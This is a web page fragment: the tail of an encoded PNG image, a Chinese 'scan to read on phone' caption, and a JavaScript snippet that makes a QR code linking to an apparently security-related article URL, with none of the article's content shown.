KG597AsuBZFoJt+f0O6rHmzAX9UdLmHfUL670zqenYe0q77y9VnVd17fi7a/e81W9/uByIBZv/NkTOAaS6ST68k5ZfpWn9ir0q5l3tH/3dd5c1B+UE8ONIS+6B3NRXpS3V+dX+cpvP9H64DEQxY3PPYHjd3sznYRT7RgtIe+2zaMl5DtGS8hbZy7Gk1DPc0JdDJcwDyZPWBtuDPl4EmryorwY7xjyK7+8NfpXuf7gfkM8rRfB4yf1vh+nKWZ6CfOO0RIrPlqirxMu0XnzaAlz+5t/ht3b8/RN2ONOjzex8suL8SbMxb6OeXC/IZ7Si+DxGeJ+MqWEuRgukYkn5POciJbI8xj6OsY7Rtd7rlfeNcyDct0bLaEudp98vImu91y/mJox9Hd9lYffb8h4gi/wfPoMyZSuwr32qZuri/Ki/Ar7mvp6vT75Ea3RI8qP3jyvdHnRenMxPcbQJ6dPvufy+oP7DfFUXgRPA8mUxnCfTlfUY65vhXd+9Y69n7q86wfl9HRUF+90femdMBfDfRb6RNczv6o9DUTzxuecwOm7LLfh9MzFPmX5jtaL6tZ3fpXLi/YR7Tei2qpGXdQnysP8XwK4xp2ur+Oqv/2C+w3JKbxQHN9lOT1xtUd10VvQ/fLiSrdP1+9y666w13ZP1837Xnuduf5VLi/q73il7zekn9KT8+MzxNvxKLrvqylHkxfDjdF51+28NermonxQTgw3hnxHPX1t+Y69vuf673h9I+43pJ/ak/NjIN6OO1zt17qVvuK9Hdabd7/6io++0lZ8ahJddw/RxtCnLsqL1piLnTcf8RiIRRufewKngTj1jqtt6rvTvQXdJ7/qIy9ab36F3XOXr/bQe9tnhd1v3v3y4qifBjKK+/nnT+CfD+Rq6uMvy9s4cnmWF7/b56pXuDHsvVpL3pqv5qs6+d5PPvjPB5KmO75/Av9sIN66r27Fuo7eIrH31a8eXHnk40mYi+ES5r33V/O7PupZM2H/4D8biIts/LsTOA0kE7uK1TJ67/RM/yp6fc+t6bzrqQflVhhPouvhEvJ9LfN4EvrynFjl1qk/gqeBPFK0Pf+/EzgGkkk/Endb+c6tSM9e5146H29C/gqjJ9TyfBV9je5XF3uP7jcXV3Xy4tj3GMhI7ufnncAeyPPO/nLl/wEAAP//l782lwAAAAZJREFUAwDfZoi/LIvJbQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-dispersedOrg-upload\_file-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 